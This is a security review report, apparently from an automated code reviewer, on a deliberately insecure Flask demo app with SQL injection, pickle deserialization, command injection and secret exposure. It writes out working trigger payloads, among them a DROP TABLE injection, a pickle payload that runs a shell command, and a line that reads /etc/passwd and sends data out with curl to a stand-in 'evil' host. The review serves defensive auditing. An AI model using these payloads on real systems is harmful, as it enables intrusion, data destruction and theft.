**Verdict:** REQUEST CHANGES — four critical-severity vulnerabilities confirmed, each independently blocking

**Score:** 5/100 — trivial-to-exploit RCE, data exfiltration, and credential leak in 38-line file; no security controls present

---

### Summary

`demo/insecure/app.py` is a deliberately insecure Flask app that exposes four independent critical vulnerabilities across four endpoints. Every endpoint introduces a separate CWE-classed flaw with no mitigations, no auth walls, no input sanitization, and no safe defaults. An attacker with no credentials can achieve remote code execution, full SQL data exfiltration, blind deserialization code execution, and API key theft.

---

### Blocking

| # | Severity | Finding | Path |
|---|----------|---------|------|
| 1 | **CRITICAL** | SQL injection via f-string in `WHERE` clause | `demo/insecure/app.py:18` |
| 2 | **CRITICAL** | Arbitrary code execution via `pickle.loads()` on attacker payload | `demo/insecure/app.py:24` |
| 3 | **CRITICAL** | OS command injection via `shell=True` with unsanitized `cmd` param | `demo/insecure/app.py:30` |
| 4 | **HIGH** | Secret exposure — `OPENROUTER_API_KEY` served directly | `demo/insecure/app.py:35` |

---

### Security audit

**Yes — four independent critical findings, each requiring remediation.**

---

### Key findings

1. **SQL injection (CWE-89)** — `demo/insecure/app.py:18`
   - **Trigger:** `GET /search?q='; DROP TABLE items; --`
   - `cur.execute(f"SELECT * FROM items WHERE name = '{q}'")` interpolates raw attacker input directly into the SQL string. No parameterized query, no escaping, no allowlist.
   - Impact: full table dump, data manipulation, RCE via SQLite `ATTACH` or `load_extension` if enabled.

2. **Insecure deserialization (CWE-502)** — `demo/insecure/app.py:24`
   - **Trigger:** `POST /load` with body `(c__builtin__\neval\nS"__import__('os').system('id')"\n.`
   - `pickle.loads(request.data)` deserializes attacker-controlled bytes directly. Pickle is not safe for untrusted input; arbitrary code execution is guaranteed.
   - Impact: full server compromise, RCE.

3. **Command injection (CWE-78)** — `demo/insecure/app.py:30`
   - **Trigger:** `GET /run?cmd=cat /etc/passwd; curl http://evil/$(whoami)`
   - `subprocess.check_output(cmd, shell=True)` passes attacker string to the shell with no sanitization. `shell=True` is the aggravating factor that enables chaining and metacharacters.
   - Impact: full RCE, lateral movement, exfiltration.

4. **Secret exposure (CWE-200/CWE-798)** — `demo/insecure/app.py:35`
   - **Trigger:** `GET /secret` — returns `OPENROUTER_API_KEY` from the environment to any unauthenticated caller.
   - Impact: API key theft, billable API abuse, supply chain pivoting if the key has broader scopes.

---

### Multi-lens checklist

| Lens | Status | Note |
|------|--------|------|
| Injection (SQL/LDAP/NoSQL/OS) | **concern** | SQLi at L18 + CMDi at L30 |
| AuthZ bypass | **ok** | No auth at all; no bypass to find |
| XSS / output escaping | **n/a** | API returns JSON, not HTML |
| CSRF / state-changing GET | **concern** | `/run` GET changes state + `shell=True` |
| Unsafe deserialization | **concern** | `pickle.loads` at L24 |
| Secrets / credential exposure | **concern** | `OPENROUTER_API_KEY` at L35 |
| SSRF / outbound | **ok** | No outbound fetch in diff |
| Path traversal / file access | **ok** | No file I/O paths in diff |
| Crypto misuse | **n/a** | No crypto operations |
| Supply chain / dependency risk | **ok** | Standard libs; pickle + subprocess misuse is in-app code, not dependency |

---

### Tests & risk

- **Tests:** None. No test file present; no positive or negative coverage.
- **Risk:** All four findings are trivially exploitable over the network with zero authentication. This code must never reach a live network, even in staging.

---

### What I checked

- Full 38-line diff of `demo/insecure/app.py`
- All four endpoints for control flow and data flow from `request` to sink
- Matched against all four known true-positive signatures (F70): `sqli-search`, `pickle-load`, `cmdi-run`, `secret-exposure` — all confirmed with concrete trigger paths

**Review effort:** 1/5 — file is small and vulnerabilities are explicit; review is straightforward confirmation

---

— **Torii Gate**
